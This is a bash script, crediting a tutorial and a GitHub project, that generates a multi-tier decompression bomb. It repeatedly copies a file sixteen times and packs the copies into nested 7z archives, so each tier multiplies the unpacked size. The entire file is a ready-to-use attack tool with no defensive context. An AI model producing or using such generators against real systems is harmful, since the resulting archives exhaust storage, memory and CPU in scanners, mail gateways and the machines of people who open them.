#!/bin/bash
# source: https://www.linuxfordevices.com/tutorials/linux/creating-zip-bombs
# idea: https://github.com/iamtraction/ZOD

# Request user input for file, tier_from, and tier_to
read -p "Enter the file to compress: " input_file
read -p "Enter the starting tier (tier_from): " tier_from
read -p "Enter the ending tier (tier_to): " tier_to

# Ensure the input file exists
if [[ ! -f $input_file ]]; then
    echo "Error: File '$input_file' not found."
    exit 1
fi

# Validate that tier_from and tier_to are integers
if ! [[ "$tier_from" =~ ^[0-9]+$ && "$tier_to" =~ ^[0-9]+$ && "$tier_from" -le "$tier_to" ]]; then
    echo "Error: Both 'tier_from' and 'tier_to' must be valid integers, with 'tier_from' <= 'tier_to'."
    exit 1
fi

# Set base directory to where the script is running
base_dir="$(pwd)"

# Initial compression for tier 0
if [[ $tier_from -eq 0 ]]; then
    bz2_file="${input_file}.bz2"
    bzip2 -zk "$input_file" -c > "$bz2_file"
    echo "Tier 0 compression done: $bz2_file"
    input_file="$bz2_file"
    ((tier_from++))
fi

# Main compression loop from tier_from to tier_to
for (( i=tier_from; i<=tier_to; i++ )); do
    # Create the tier directory if it doesn't exist
    tier_dir="$base_dir/tier_$i"
    mkdir -p "$tier_dir"

    # Prepare 16 copies of the file with suffixes _1 to _16 in the tier directory
    for (( j=1; j<=16; j++ )); do
        cp "$input_file" "$tier_dir/$(basename "${input_file%.*}")_v${i}_$j.${input_file##*.}"
    done
    echo "Tier $i: Created 16 copies with suffixes _1 to _16 in $tier_dir."

    # Compress all copies in the tier directory into a single 7z archive
    output_file="${input_file%.*}_v${i}.7z"
    7zz a -t7z "$tier_dir/$(basename "$output_file")" "$tier_dir"/* >/dev/null
    echo "Tier $i compression complete: $tier_dir/$(basename "$output_file")"

    # Move the compressed file to the root directory and remove cumulative version numbers
    final_output="$base_dir/$(basename "${input_file%.*}")_v${i}.7z"
    mv "$tier_dir/$(basename "$output_file")" "$final_output"
    echo "Moved compressed file to root directory: $final_output"

    # Update input file to be the newly created 7z file for the next tier
    input_file="$final_output"
done

echo "Final file: $input_file"
